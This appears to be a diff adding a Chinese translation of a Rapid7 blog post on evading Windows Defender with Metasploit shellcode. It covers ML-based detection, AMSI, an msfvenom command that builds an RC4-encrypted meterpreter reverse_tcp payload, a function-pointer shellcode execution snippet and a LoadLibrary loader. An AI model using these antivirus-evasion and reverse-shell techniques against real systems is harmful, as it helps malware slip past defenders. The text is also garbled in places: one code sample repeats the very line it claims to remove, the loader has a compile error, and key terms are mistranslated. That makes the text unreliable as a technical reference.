@@ -1,0 +1,177 @@
+在安全领域的攻击方面，我个人非常尊敬反病毒软件行业的研究员和工程师，和那些专注于投资反病毒软件的公司们。如果说恶意软件开发是一场猫鼠游戏，那么我会说这个行业创造了最可怕的猎人。在使用Mertasploit时，渗透测试人员和红队队员遭受最多的折磨，这就迫使我调查如何通过提高我们的payload
+evasion，说实话，它真的太难了。
+
+对于这个实验，我有两个非常重要的要求：
+
+  1. 找到重新使用现存的Metassploit shellcode的解决方法；
+
+  2. 未经修改的shellcode不应该被流行的反病毒软件检测到。
+
+Metasploit
+shellcode面临的挑战之一就是它们很小，因为大小会影响到各种战术推理。这也使shellcode很难改进，并且最终，所有的AV分类器都有”EVIL”字样。你没有机会。
+
+大部分现代反病毒引擎都是由机器学习提供支持，而且这对于AV
+evasion而言是一个巨大的规则变革者。AV引擎不仅在检测潜在威胁方面更加智能，他们反应速度也更快。只要你的代码行为有一点像恶意软件，恶意软件可能只是利用错误的Windows
+API(例如WriteProcessMemory
+甚至VirtualAlloc)，其中一个AI检查器就会帮助你。恶意软件研究人员也会复制一分你的代码，这就意味着将会在几分钟内销毁你所有的辛勤工作。
+
+描述基于机器学习的反病毒程序的最好方法就是它在设计上有两个组件:客户端 ML和云ML。
+
+## 客户端ML
+
+客户端ML是与我们这些用户有互动的东西。绝大部分扫描对象都是由内置于Windows Defender
+客户端的轻量级机器学习组件进行评估的。这些组件在操作系统中运行。
+
+根据微软所言，诸如传统签名，泛型，行为检测，启发法等等这些分类，占据客户端恶意软件的97%。利用这种分类器，客户端可以收集程序的“特征”，这些特征就意味着被扫描物体的可测数据和特点。
+
+客户端机器可以独立运行，但是没有云，Windows
+Defender在检测已知威胁方面最好，而不是未知。这就意味着如果你链接到内部有困难，那么你更容易受到来自内部的攻击。
+
+## 云ML
+
+云ML一种很神秘的东西，因为除了某些发布在微软网站上的博客文章和一个使用LightGBM框架的提示，我们不能访问别的代码和训练数据。
+
+LightGBM框架是基于DecisionTree
+模型，尽管流行，但是问任何一个机器学习专家，他们都会告诉你这是非常基础的。拥有计算机科学学位的大学毕业生也应该能告诉你不少关于ightGBM框架的内容。
+
+在机器学习中，最热门的话题就是深度学习。尽管微软有一个深度学习toolkit叫做CNTK，但是并没有很多关于Windows
+Defender的云ML使用CNTK的信息。所以这并不是我们将会进一步讨论的内容。
+
+我们所知道的是：客户端ML何时不能做出明智的裁决，他将会把云服务器用于深度分析。而且当这个进程被牵扯进来时，它就变成了恶意软件的噩梦。
+
+分析的第一轮是基于恶意数据的ML模块。在你的操作系统中，这可能是云交付保护选项，以及你会注意到它实际上是由于额外的延迟，当你在Windows
+上执行文件。通常，对我而言逃避客户端ML的静态和实时保护，它不是一个问题。但是当云交付保护开启时，我失败了。
+
+为了充分利用云服务，这有另一个选项，叫做Automatic Sample
+Submission，它可以把您的可疑程序发送给微软，并通过额外的检测运行，例如基于样本分析和基于detonation的ML模块。如果云判定你的代码是恶意的，它将会打上泛型AI标签中的一个：Fuerbkks,Fury,
+Cloxer, 或 Azden。之后你的攻击就不再起作用了。
+
+## 反恶意软件扫描端口
+
+Antimalware Scan Interface (AMSI)是一个由微软创造的程序设计端口，允许任何Windows应用程序利用Windows
+Defender引擎并扫描恶意输入，这会让AV
+evasion更加困难。一个此类应用程序的例子是Powershell，它给我们一个机会可以讨论为什么当Powershell涉及到AV
+evasion时，就不是你最重要的朋友。
+
+Powershell已经成为攻击者的大型游乐场，因为与传统的可执行文件相比，反病毒软件在检查时效果不佳。您还可以将一行Powershell代码作为Powershell.exe的论点，这会造成隐形，因为技术上我们没有接触到磁盘。例如：
+
+    
+    
+    powershell.exe -command"WriteOutput[Convert]::FromBase64String('SGVsbG8gV29ybGQh')"
+    
+
+这就是Powershell出卖你的地方。在底层，实际上Powershell调用AmsiScanBuffer函数来询问Windows
+Defender用户提供的代码是否是恶意的。：
+
+![1.png](https://image.3001.net/images/20180507/15256892806056.png!small)
+
+Powershell被严重滥用，它开始看起来可预测。如果你是一个IT管理员，而且你看到一些Base64字符串被传递给Powershell.exe，他可能不是很好。作为一个攻击者，我们应该意识到Powershell不再是每一个每个人的最喜欢的payload技术。AMSI为任何Windows应用程序提供了从Windows
+Defender的功能中收益的能力，这使脚本语言它更难以滥用。
+
+尽管Windows Defender配备了所有的技术，但是他并不是没有盲点。为了确保我们的payload可以生存，我发现了一些我想要分享的提示：
+
+## Shellcode存活提示1：加密
+
+如果你非常熟悉Metasploit
+框架，你将会知道这里有一个叫做encoders的模块类型。一个编码器的目的是在漏洞中绕过有问题的字符。举个例子，如果你正在利用缓冲区溢出，你的长字符串中一个空字符都不能有。我们可以使用编码器来改变空字节，然后在运行时把它改回来。
+
+我非常确定，在你生活的某一个时刻，你会尝试使用编码器来绕过AV。尽管有些时候它会起作用，编码器并不适合AV evasion，你应该使用加密。
+
+加密是一种能够有效反击反病毒软件静态扫描功能的方法，因为AV引擎不能立刻爆破它。目前，这有一些msfvenom支持的加密算法保护你的shellcode:AES256-CBC,RC4,Base64,和XOR。
+
+用msfvenom生成一个加密的shellcode，这是一个使用Metasploit 5的例子：
+
+    
+    
+    ruby ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f c
+    
+
+上面的生成一个用RC4加密的windows/meterpreter/reverse_tcp.它也可以用C模式生成，以便你可以在C/C++中构建你个人的加载程序。尽管反病毒软件不擅长静态扫描加密shellcode，运行时的监控仍然是一道强力的防线。解密和执行后很容易抓取。
+
+## Shellcode存活提示2：分离
+
+运行监测真的很难欺骗，因为在一天结束时，你需要执行代码，一旦您这样做了，反病毒软件会记录您的一举一动，然后最终确定你是恶意软件。然而，如果你可以把loader和不同进程空间中的真实payload分离，这似乎就不是什么问题了。
+
+这是我尝试执行解密payload的时候注意到的行为。首先，我能够很好解密我的shellcode，由于我的恶意shellcode仍在内存中，但是只要我试图像这样从函数指针中执行它，AV就会抓住我：
+
+    
+    
+    int (*func)();
+    
+    
+    
+    func = (int (*)()) shellcode;
+    
+    
+    
+    (int)(*func)();
+    
+
+然而，如果我把最后一行移走，然后AV对程序就会很友好：
+
+    
+    
+    (int)(*func)();
+    
+
+这似乎意味着，只要你不执行它，把恶意代码放在它的内存中通常没问题。运行时分析很大程度上依赖于实际执行的代码；它不关心程序可能会做什么。当然，这是有意义的。如果是这样，性能损失太高了了。
+
+因此，我没有使用函数指针，而是使用LoadLibrary解决加载器的问题。
+
+    
+    
+    #include <iostream>
+    
+    
+    
+    #include <Windows.h>
+    
+    
+    
+    int main(void) {
+    
+    
+    
+      HMODULE hMod = LoadLibrary("shellcode.dll");
+    
+    
+    
+      if (hMod == nullptr) {
+    
+    
+    
+        cout << "Failed to load shellcode.dll" << endl;
+    
+    
+    
+      }
+    
+    
+    
+      return 0;
+    
+    
+    
+    }
+    
+
+## 老鼠又活了一天……
+
+AV
+evasion实际上是一场艰难地比赛。尽管事实上我找到了一个可以解决检测问题的解决方案，但不应该担心他们会抓住你的很酷的把戏，而且多亏了尖端科技和背后的人才，可以迅速终止你的攻击。
+
+这很像在猫鼠游戏中存活，而且在今天，老鼠活着。利用类似加密和自定义加载程序之类的东西，您仍然可以创建某些东西，它对于AV引擎而言很难理解而且可以让你成功进入目标机器。
+
+以下是综合上述所有技术的演示：
+
+[AV Evasion for Metasploit 5](https://youtu.be/dRkQiANI138)
+
+## Metasploit是免费的！
+
+此外，我有提到过Metasploit框架是完全免费的吗？可以在此处[下载](https://metasploit.com)
+
+如果你对在哪里获得Metasploit 5感兴趣，他正处于发展中。最好的资源是[Metasploit’sGithub
+repository](https://github.com/rapid7/metasploit-framework)：用msf5标签查看pull请求，我们也接受pull请求。
+
+*参考来源：[HidingMetasploit Shellcode to Evade Windows Defender](https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/)，文章内容以原文为准，本文由丁牛网安实验室小编EVA编辑整理，如需转载请标明出处。
+
